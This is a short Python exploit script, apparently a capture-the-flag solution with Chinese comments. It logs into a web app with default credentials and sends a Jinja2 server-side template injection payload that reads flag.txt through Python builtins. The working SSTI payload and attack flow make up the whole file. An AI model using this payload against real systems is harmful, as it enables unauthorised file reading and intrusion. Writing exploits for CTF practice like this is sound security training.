# coding:utf-8
import requests
import re
import sys

"""
@文件命名：XBOX-93
@使用方式: python 093.py http://localhost:5003
@简述思路: 利用SSTI漏洞，通过Jinja2模板注入读取flag.txt内容
"""


def Scan(url):
    flag = ""
    session = requests.Session()
    try:
        # 1. 登录
        login_url = url.rstrip("/") + "/login"
        data = {"username": "user", "password": "user"}
        session.post(login_url, data=data)

        # 2. 构造SSTI payload
        payload = (
            "{{get_flashed_messages.__globals__.__builtins__.open('flag.txt').read()}}"
        )
        remind_url = url.rstrip("/") + f"/remind?date={payload}"
        resp = session.get(remind_url)

        # 3. 匹配flag
        match = re.search(r"(flag\{[^\}]+\}|FLAG\{[^\}]+\})", resp.text)
        if match:
            flag = match.group(1)
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("用法: python exp.py <url>")
    else:
        print(Scan(url=sys.argv[1]))
